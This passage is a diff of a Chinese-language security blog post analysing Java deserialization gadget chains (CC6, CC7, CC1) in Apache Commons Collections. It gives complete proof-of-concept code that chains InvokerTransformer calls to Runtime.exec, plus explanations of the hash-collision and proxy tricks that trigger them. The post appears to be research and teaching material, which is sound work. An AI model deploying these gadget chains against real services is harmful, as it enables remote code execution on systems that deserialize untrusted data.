+<span class="nc">Field</span> <span class="n">key</span> <span class="o">=</span> <span class="n">node</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"key"</span><span class="o">);</span>
+<span class="n">key</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+<span class="n">key</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">node</span><span class="o">,</span><span class="n">tiedMapEntry</span><span class="o">);</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">HashMap.table</code> 类型为 <code class="language-plaintext highlighter-rouge">Entry.Class</code> , 是HashMap更为底层的实现，其中key就封装在这里面，通过反射修改其key，就可以传递修改HashSet的key值。</p>
+
+<p>在java中没有指针，我们使用对象引用 node ，从达到对<code class="language-plaintext highlighter-rouge">table.key</code>的修改。这里解释一下这一代码：</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span><span class="o">(</span><span class="nc">Object</span> <span class="nl">o:</span><span class="n">array</span><span class="o">){</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">o</span><span class="o">!=</span><span class="kc">null</span><span class="o">){</span>
+        <span class="n">node</span> <span class="o">=</span><span class="n">o</span><span class="o">;</span>
+        <span class="k">break</span><span class="o">;</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/02/20220221113532.png" alt="image-20220221113532506" /></p>
+
+<p>虽然我们初始化hashmap只有一个元素<code class="language-plaintext highlighter-rouge">hashmap.put("123","456");</code>但是Entry的大小却是16，我们需要迭代来找到初始化的那一个键值对进行修改。</p>
+
+<h3 id="hashset的-kick-off-">Hashset的『 kick-off 』</h3>
+
+<p>但是正规的cc6并没有直接使用hashmap作为『 kick-off 』，而是使用了 <strong>Hashset</strong>，首先我们先了解一下什么是Hashset：</p>
 
 <blockquote>
   <p>HashSet扩展了 AbstractSet 接口并实现了 Set 接口 , 它创建了一个使用 HashMap 进行存储的<strong>没有重复元素</strong>的集合</p>
@@ -1338,9 +1439,7 @@ var6: fakevalue
 <span class="o">}</span>
 </code></pre></div></div>
 
-<p>那么我们只需要把HashSet中的key</p>
-
-<p>刚开始看poc的构造还有些迷糊，现在拆开看看：</p>
+<p>其实和hashmap没什么两样，反射修改key即可。</p>
 
 <div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">HashSet</span> <span class="n">hashset</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">HashSet</span><span class="o">(</span><span class="mi">1</span><span class="o">);</span>
 <span class="n">hashset</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"foo"</span><span class="o">);</span>
@@ -1353,24 +1452,743 @@ var6: fakevalue
 <span class="nc">Field</span> <span class="n">table</span> <span class="o">=</span> <span class="nc">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"java.util.HashMap"</span><span class="o">).</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"table"</span><span class="o">);</span>
 <span class="n">table</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
 <span class="nc">Object</span><span class="o">[]</span> <span class="n">array</span> <span class="o">=</span> <span class="o">(</span><span class="nc">Object</span><span class="o">[])</span><span class="n">table</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">hashset_map</span><span class="o">);</span>
-<span class="nc">Object</span> <span class="n">node</span> <span class="o">=</span> <span class="n">array</span><span class="o">[</span><span class="mi">0</span><span class="o">];</span>
+<span class="nc">Object</span> <span class="n">node</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+<span class="k">for</span><span class="o">(</span><span class="nc">Object</span> <span class="nl">o:</span><span class="n">array</span><span class="o">){</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">o</span><span class="o">!=</span><span class="kc">null</span><span class="o">){</span>
+        <span class="n">node</span> <span class="o">=</span><span class="n">o</span><span class="o">;</span>
+        <span class="k">break</span><span class="o">;</span>
+    <span class="o">}</span>
+<span class="o">}</span>
 <span class="c1">//修改table中的key</span>
 <span class="nc">Field</span> <span class="n">key</span> <span class="o">=</span> <span class="n">node</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"key"</span><span class="o">);</span>
 <span class="n">key</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
 <span class="n">key</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">node</span><span class="o">,</span><span class="n">tiedMapEntry</span><span class="o">);</span>
 </code></pre></div></div>
 
-<p><code class="language-plaintext highlighter-rouge">HashMap.table</code> 类型为 <code class="language-plaintext highlighter-rouge">Entry.Class</code> , 是HashMap更为底层的实现，其中key就封装在这里面，通过反射修改其key，就可以传递修改HashSet的key值。</p>
+<h2 id="cc-7">CC 7</h2>
 
-<p>有一点疑问，为什么不可以直接通过反射修改HashMap的key呢？</p>
+<h3 id="利用条件">利用条件</h3>
 
-<h1 id="cc-7">CC 7</h1>
+<ul>
+  <li><strong>cc3.1～3.2.1</strong></li>
+  <li><strong>jdk 版本暂无限制</strong></li>
+</ul>
 
-</div><section class="article__sharing d-print-none"></section><div class="d-print-none"><footer class="article__footer"><meta itemprop="dateModified" content="2022-02-16T00:39:32+08:00"><!-- start custom article footer snippet -->
+<h3 id="完整poc-3">完整poc</h3>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Poc</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
+        <span class="nc">Transformer</span> <span class="n">transformerChain</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ChainedTransformer</span><span class="o">(</span><span class="k">new</span> <span class="nc">Transformer</span><span class="o">[]{});</span>
+        <span class="nc">Transformer</span><span class="o">[]</span> <span class="n">transformers</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Transformer</span><span class="o">[]{</span>
+                <span class="k">new</span> <span class="nf">ConstantTransformer</span><span class="o">(</span><span class="nc">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
+                <span class="k">new</span> <span class="nf">InvokerTransformer</span><span class="o">(</span><span class="s">"getMethod"</span><span class="o">,</span>
+                        <span class="k">new</span> <span class="nc">Class</span><span class="o">[]{</span><span class="nc">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="nc">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
+                        <span class="k">new</span> <span class="nc">Object</span><span class="o">[]{</span><span class="s">"getRuntime"</span><span class="o">,</span> <span class="k">new</span> <span class="nc">Class</span><span class="o">[</span><span class="mi">0</span><span class="o">]}),</span>
+                <span class="k">new</span> <span class="nf">InvokerTransformer</span><span class="o">(</span><span class="s">"invoke"</span><span class="o">,</span>
+                        <span class="k">new</span> <span class="nc">Class</span><span class="o">[]{</span><span class="nc">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="nc">Object</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
+                        <span class="k">new</span> <span class="nc">Object</span><span class="o">[]{</span><span class="kc">null</span><span class="o">,</span> <span class="k">new</span> <span class="nc">Object</span><span class="o">[</span><span class="mi">0</span><span class="o">]}),</span>
+                <span class="k">new</span> <span class="nf">InvokerTransformer</span><span class="o">(</span><span class="s">"exec"</span><span class="o">,</span>
+                        <span class="k">new</span> <span class="nc">Class</span><span class="o">[]{</span><span class="nc">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="nc">Object</span><span class="o">[]{</span><span class="s">"open  -a Calculator"</span><span class="o">})</span>
+        <span class="o">};</span>
+        <span class="nc">Map</span> <span class="n">innerMap1</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">HashMap</span><span class="o">();</span>
+        <span class="nc">Map</span> <span class="n">innerMap2</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">HashMap</span><span class="o">();</span>
+
+        <span class="nc">Map</span> <span class="n">lazyMap1</span> <span class="o">=</span> <span class="nc">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">innerMap1</span><span class="o">,</span> <span class="n">transformerChain</span><span class="o">);</span>
+        <span class="n">lazyMap1</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"yy"</span><span class="o">,</span> <span class="mi">1</span><span class="o">);</span>
+
+        <span class="nc">Map</span> <span class="n">lazyMap2</span> <span class="o">=</span> <span class="nc">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">innerMap2</span><span class="o">,</span> <span class="n">transformerChain</span><span class="o">);</span>
+        <span class="n">lazyMap2</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"zZ"</span><span class="o">,</span> <span class="mi">1</span><span class="o">);</span>
+
+        <span class="nc">Hashtable</span> <span class="n">hashtable</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Hashtable</span><span class="o">();</span>
+        <span class="n">hashtable</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">lazyMap1</span><span class="o">,</span> <span class="mi">1</span><span class="o">);</span>
+        <span class="n">hashtable</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">lazyMap2</span><span class="o">,</span> <span class="mi">2</span><span class="o">);</span>
+
+        <span class="nc">Field</span> <span class="n">field</span> <span class="o">=</span><span class="n">transformerChain</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"iTransformers"</span><span class="o">);</span>
+        <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">field</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">transformerChain</span><span class="o">,</span><span class="n">transformers</span><span class="o">);</span>
+        <span class="n">lazyMap2</span><span class="o">.</span><span class="na">remove</span><span class="o">(</span><span class="s">"yy"</span><span class="o">);</span>
+
+        <span class="c1">//客户端写payload</span>
+        <span class="nc">ObjectOutputStream</span> <span class="n">objectOutputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ObjectOutputStream</span><span class="o">(</span><span class="k">new</span> <span class="nc">FileOutputStream</span><span class="o">(</span><span class="s">"bin/CC7Poc.bin"</span><span class="o">));</span>
+        <span class="n">objectOutputStream</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">hashtable</span><span class="o">);</span>
+        <span class="n">objectOutputStream</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+
+        <span class="c1">//服务端读paylaod</span>
+        <span class="nc">ObjectInputStream</span> <span class="n">objectInputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="nc">FileInputStream</span><span class="o">(</span><span class="s">"bin/CC7Poc.bin"</span><span class="o">));</span>
+        <span class="n">objectInputStream</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<h3 id="前置知识">前置知识</h3>
+
+<h4 id="hash冲突">hash冲突</h4>
+
+<p>在调试cc7之前，我们先简单了解一下hash冲突，不然对后续的一些概念可能难以理解。</p>
+
+<p>首先，为什么会有hash冲突的情况呢？说白了，hash 表就是牺牲空间来换取时间的一种数据结构，但是我们不可能无限制初始化 hash 表的大小，所以在进行hash表的填充时的有以下两种hash冲突的可能：</p>
+
+<ol>
+  <li>不同的key，经过<code class="language-plaintext highlighter-rouge">hashcode()</code>运算得到的hashcode相同。</li>
+  <li>不同的hashcode 取余后落在一个bucket(hash表index的值)里。</li>
+</ol>
+
+<p>一般来说第二种情况比较常见，我们用 <strong>Linklist</strong> 数据结构把落在同一个bucket里的数据”串”起来，就像下图。</p>
+
+<p><img src="../../assets/images/image-20220221203201205.png" alt="image-20220221203201205" /></p>
+
+<p>但随着元素的增长，每个bucket所对应的 <strong>Linklist</strong> 会越来越长，最后退化成纯链表，所以我们设置元素 <strong>N</strong> 和 bucket数量<strong>M</strong>的比值为<strong>L</strong> 为负载因子 (<strong>load factor</strong>)。当负载因子较大</p>
+
+<p>时，我们需要对hash表扩容并重新调整位置，以提高效率。</p>
+
+<p>有点扯远了… 因为在cc7中考虑的hash冲突是第一种情况，我们先看看<strong>String</strong>类型的<code class="language-plaintext highlighter-rouge">hashcode()</code></p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kt">int</span> <span class="nf">hashCode</span><span class="o">()</span> <span class="o">{</span>
+    <span class="kt">int</span> <span class="n">h</span> <span class="o">=</span> <span class="n">hash</span><span class="o">;</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">h</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">value</span><span class="o">.</span><span class="na">length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
+        <span class="kt">char</span> <span class="n">val</span><span class="o">[]</span> <span class="o">=</span> <span class="n">value</span><span class="o">;</span>
+
+        <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">value</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
+            <span class="n">h</span> <span class="o">=</span> <span class="mi">31</span> <span class="o">*</span> <span class="n">h</span> <span class="o">+</span> <span class="n">val</span><span class="o">[</span><span class="n">i</span><span class="o">];</span>
+        <span class="o">}</span>
+        <span class="n">hash</span> <span class="o">=</span> <span class="n">h</span><span class="o">;</span>
+    <span class="o">}</span>
+    <span class="k">return</span> <span class="n">h</span><span class="o">;</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>针对所有ascii码字符，如果想避免出现相同的hashcode，h的取值应为128，但是这样计算效率会慢很多，可以看到这里的h为31，那完全可以构造相同的hashcode。</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ord("y") == 121 , ord("z") == 122 , ord("Z") == 90
+
+"yy".hashCode() == 31 × 121 + 1 × 121 == 3872
+
+"zZ".hashCode() == 31 × 122 + 1 × 90 == 3872
+</code></pre></div></div>
+
+<p><strong>Linklist</strong> 中的结点，都是一个<strong>Entry</strong>类型。</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>protected Entry(int hash, K key, V value, Entry&lt;K,V&gt; next) {
+    this.hash = hash;
+    this.key =  key;
+    this.value = value;
+    this.next = next;
+}
+</code></pre></div></div>
+
+<h3 id="先看kick-off">先看『kick-off』</h3>
+
+<p>说了这么多，我们直接来看cc7的触发点-&gt;<strong>Hashtable.readObject()</strong></p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">private</span> <span class="kt">void</span> <span class="nf">readObject</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">ObjectInputStream</span> <span class="n">s</span><span class="o">)</span>
+     <span class="kd">throws</span> <span class="nc">IOException</span><span class="o">,</span> <span class="nc">ClassNotFoundException</span>
+<span class="o">{</span>        
+  <span class="o">...</span>
+  <span class="k">for</span> <span class="o">(;</span> <span class="n">elements</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="o">;</span> <span class="n">elements</span><span class="o">--)</span> <span class="o">{</span>
+    <span class="no">K</span> <span class="n">key</span> <span class="o">=</span> <span class="o">(</span><span class="no">K</span><span class="o">)</span><span class="n">s</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+    <span class="no">V</span> <span class="n">value</span> <span class="o">=</span> <span class="o">(</span><span class="no">V</span><span class="o">)</span><span class="n">s</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+    <span class="n">reconstitutionPut</span><span class="o">(</span><span class="n">newTable</span><span class="o">,</span> <span class="n">key</span><span class="o">,</span> <span class="n">value</span><span class="o">);</span>
+  <span class="o">}</span>
+  <span class="o">...</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">reconstitutionPut(newTable, key, value)</code>-&gt;</p>
+
+<p><img src="../../assets/images/image-20220221220847463.png" alt="image-20220221220847463" /></p>
+
+<p>当我们反序列化一个 hashtable 类型，其每一个键值对都会也都会执行<code class="language-plaintext highlighter-rouge"> readobject</code> ，其实相当于都是重新<code class="language-plaintext highlighter-rouge">put</code>到这个哈希表中，所以也进行了hash计算，如果红框前面的hash冲突成立，那么就会执行<code class="language-plaintext highlighter-rouge">key.equal()</code>，在poc中，我们key的类型为<strong>LazyMap</strong>，我们看看<code class="language-plaintext highlighter-rouge">LazyMap.equal()</code>。</p>
+
+<p><strong>LazyMap</strong>继承于<strong>AbstractMapDecorator</strong>，其<code class="language-plaintext highlighter-rouge">equal()</code>方法调用的是<code class="language-plaintext highlighter-rouge">this.map.equals()</code></p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">equals</span><span class="o">(</span><span class="nc">Object</span> <span class="n">object</span><span class="o">)</span> <span class="o">{</span>
+    <span class="k">return</span> <span class="n">object</span> <span class="o">==</span> <span class="k">this</span> <span class="o">?</span> <span class="kc">true</span> <span class="o">:</span> <span class="k">this</span><span class="o">.</span><span class="na">map</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">object</span><span class="o">);</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>在创建<strong>LazyMap</strong>时，我们指定了 <code class="language-plaintext highlighter-rouge">this.map</code>类型为 <strong>HashMap</strong>，所以调用的为 <code class="language-plaintext highlighter-rouge">HashMap.equals()</code>,<strong>HashMap</strong> 继承于 <strong>AbstractMap</strong>，所以最终掉用的为 <code class="language-plaintext highlighter-rouge">AbstractMap.equal()</code>:</p>
+
+<p><img src="../../assets/images/image-20220222093221271.png" alt="image-20220222093221271" /></p>
+
+<p>红框里调用了<code class="language-plaintext highlighter-rouge">m.get()</code>,从蓝框里看出来m是<code class="language-plaintext highlighter-rouge">equal()</code>传入的参数，也就是另外一个 <code class="language-plaintext highlighter-rouge">LazyMap</code>，也就成功走到了<code class="language-plaintext highlighter-rouge">LazyMap.get()</code>。</p>
+
+<p>ok我们现在已经知道如何从 <code class="language-plaintext highlighter-rouge">HashTable.readobject</code>走到<code class="language-plaintext highlighter-rouge">LazyMap.get()</code>，但是回头看poc，好像还有几个问题需要解决。</p>
+
+<h3 id="出现的问题">出现的问题</h3>
+
+<h4 id="反射修改chainedtransformer">反射修改ChainedTransformer</h4>
+
+<p>你会发现cc7的poc关于sink的构造和之前的不同，我们初始只创建了一个空的 <strong>ChainedTransformer</strong>，后续再用反射进行了修改，这是因为我们在进行这一行代码</p>
+
+<p><code class="language-plaintext highlighter-rouge">hashtable.put(lazyMap2, 2);</code>时，也会触发sink。</p>
+
+<p><img src="../../assets/images/image-20220222102143358.png" alt="image-20220222102143358" /></p>
+
+<p>这里的代码和反序列化的<code class="language-plaintext highlighter-rouge">reconstitutionPut()</code>基本上一致，我们处理的方法也很简单，在构造的最后再反射修改sink点。</p>
+
+<h4 id="删除多余元素">删除多余元素</h4>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">lazyMap1</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"yy"</span><span class="o">,</span> <span class="mi">1</span><span class="o">);</span>
+
+<span class="nc">Map</span> <span class="n">lazyMap2</span> <span class="o">=</span> <span class="nc">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">innerMap2</span><span class="o">,</span> <span class="n">transformerChain</span><span class="o">);</span>
+<span class="n">lazyMap2</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"zZ"</span><span class="o">,</span> <span class="mi">1</span><span class="o">);</span>
+
+<span class="nc">Hashtable</span> <span class="n">hashtable</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Hashtable</span><span class="o">();</span>
+<span class="n">hashtable</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">lazyMap1</span><span class="o">,</span> <span class="mi">1</span><span class="o">);</span>
+<span class="n">hashtable</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">lazyMap2</span><span class="o">,</span> <span class="mi">2</span><span class="o">);</span>
+<span class="nc">Field</span> <span class="n">field</span> <span class="o">=</span><span class="n">transformerChain</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"iTransformers"</span><span class="o">);</span>
+<span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+<span class="n">field</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">transformerChain</span><span class="o">,</span><span class="n">transformers</span><span class="o">);</span>
+<span class="n">lazyMap2</span><span class="o">.</span><span class="na">remove</span><span class="o">(</span><span class="s">"yy"</span><span class="o">);</span>
+</code></pre></div></div>
+
+<p><strong>lazyMap2</strong> 并没有 “yy” 的key，但是我们最后执行了删除这一步，调试发现在<code class="language-plaintext highlighter-rouge">hashtable.put(lazyMap2, 2);</code>这一步之后，<strong>lazyMap2</strong>发生了变化，原理和上一点相同，这一步也会走到sink的触发点-&gt;<code class="language-plaintext highlighter-rouge">LazyMap.get()</code>：</p>
+
+<p><img src="../../assets/images/image-20220222105804939.png" alt="image-20220222105804939" /></p>
+
+<p>当前断点位置也就是sink点，而下面一行代码<code class="language-plaintext highlighter-rouge">super.map.put(key, value);</code>就会对 <strong>lazyMap</strong> 的<code class="language-plaintext highlighter-rouge">HashMap</code> put 进要比较的元素，导致其变化。</p>
+
+<p><img src="../../assets/images/image-20220222110244871.png" alt="image-20220222110244871" /></p>
+
+<p>而变化的后果，就是在反序列化进入<code class="language-plaintext highlighter-rouge">equal()</code>,两者size不一致返回false</p>
+
+<p><img src="../../assets/images/image-20220222112127565.png" alt="image-20220222112127565" /></p>
+
+<p>至此，cc7分析结束。</p>
+
+<h2 id="cc-1">CC 1</h2>
+
+<h3 id="利用要求-3">利用要求</h3>
+
+<p>同cc 0</p>
+
+<ul>
+  <li><strong>cc3.1～3.2.1</strong></li>
+  <li><strong>jdk 1.7</strong>(8u71之前都可以)</li>
+</ul>
+
+<p>mvn：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;dependency&gt;
+    &lt;groupId&gt;commons-collections&lt;/groupId&gt;
+    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
+    &lt;version&gt;3.1&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre></div></div>
+
+<h3 id="完整poc-4">完整poc</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ObjectInputStream.readObject()
+    AnnotationInvocationHandler.readObject()
+        Map(Proxy).entrySet()
+            AnnotationInvocationHandler.invoke()
+                LazyMap.get()
+                    ChainedTransformer.transform()
+                        ConstantTransformer.transform()
+                        InvokerTransformer.transform()
+                            Method.invoke()
+                                Class.getMethod()
+                        InvokerTransformer.transform()
+                            Method.invoke()
+                                Runtime.getRuntime()
+                        InvokerTransformer.transform()
+                            Method.invoke()
+                                Runtime.exec()
+</code></pre></div></div>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Poc</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span><span class="o">{</span>
+        <span class="nc">Transformer</span><span class="o">[]</span> <span class="n">transformers</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Transformer</span><span class="o">[]{</span>
+                <span class="k">new</span> <span class="nf">ConstantTransformer</span><span class="o">(</span><span class="nc">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
+                <span class="k">new</span> <span class="nf">InvokerTransformer</span><span class="o">(</span><span class="s">"getMethod"</span><span class="o">,</span>
+                        <span class="k">new</span> <span class="nc">Class</span><span class="o">[]{</span><span class="nc">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="nc">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
+                        <span class="k">new</span> <span class="nc">Object</span><span class="o">[]{</span><span class="s">"getRuntime"</span><span class="o">,</span> <span class="k">new</span> <span class="nc">Class</span><span class="o">[</span><span class="mi">0</span><span class="o">]}),</span>
+                <span class="k">new</span> <span class="nf">InvokerTransformer</span><span class="o">(</span><span class="s">"invoke"</span><span class="o">,</span>
+                        <span class="k">new</span> <span class="nc">Class</span><span class="o">[]{</span><span class="nc">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="nc">Object</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
+                        <span class="k">new</span> <span class="nc">Object</span><span class="o">[]{</span><span class="kc">null</span><span class="o">,</span> <span class="k">new</span> <span class="nc">Object</span><span class="o">[</span><span class="mi">0</span><span class="o">]}),</span>
+                <span class="k">new</span> <span class="nf">InvokerTransformer</span><span class="o">(</span><span class="s">"exec"</span><span class="o">,</span>
+                        <span class="k">new</span> <span class="nc">Class</span><span class="o">[]{</span><span class="nc">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="nc">Object</span><span class="o">[]{</span><span class="s">"open  -a Calculator"</span><span class="o">})</span>
+        <span class="o">};</span>
+        <span class="nc">Transformer</span> <span class="n">transformerChain</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ChainedTransformer</span><span class="o">(</span><span class="n">transformers</span><span class="o">);</span>
+
+
+        <span class="nc">HashMap</span> <span class="n">innermap</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">HashMap</span><span class="o">();</span>
+        <span class="n">innermap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"value"</span><span class="o">,</span><span class="s">"abcd"</span><span class="o">);</span>
+        <span class="nc">LazyMap</span> <span class="n">map</span> <span class="o">=</span> <span class="o">(</span><span class="nc">LazyMap</span><span class="o">)</span> <span class="nc">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">innermap</span><span class="o">,</span><span class="n">transformerChain</span><span class="o">);</span>
+        <span class="nc">Constructor</span> <span class="n">handler_constructor</span> <span class="o">=</span> <span class="nc">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="o">).</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="nc">Class</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="nc">Map</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+        <span class="n">handler_constructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="c1">// 创建一个与代理对象相关联的InvocationHandler</span>
+        <span class="nc">InvocationHandler</span> <span class="n">map_handler</span> <span class="o">=</span> <span class="o">(</span><span class="nc">InvocationHandler</span><span class="o">)</span> <span class="n">handler_constructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="nc">Override</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">map</span><span class="o">);</span>
+        <span class="c1">// 创建代理对象proxy_map来代理map，代理对象执行的所有方法都会替换执行InvocationHandler中的invoke方法</span>
+        <span class="nc">Map</span> <span class="n">proxy_map</span> <span class="o">=</span> <span class="o">(</span><span class="nc">Map</span><span class="o">)</span> <span class="nc">Proxy</span><span class="o">.</span><span class="na">newProxyInstance</span><span class="o">(</span><span class="nc">ClassLoader</span><span class="o">.</span><span class="na">getSystemClassLoader</span><span class="o">(),</span><span class="k">new</span> <span class="nc">Class</span><span class="o">[]{</span><span class="nc">Map</span><span class="o">.</span><span class="na">class</span><span class="o">},</span><span class="n">map_handler</span><span class="o">);</span>
+        <span class="nc">Constructor</span> <span class="n">AnnotationInvocationHandler_Constructor</span> <span class="o">=</span> <span class="nc">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="o">).</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="nc">Class</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="nc">Map</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+        <span class="n">AnnotationInvocationHandler_Constructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="c1">//反射创建实例对象</span>
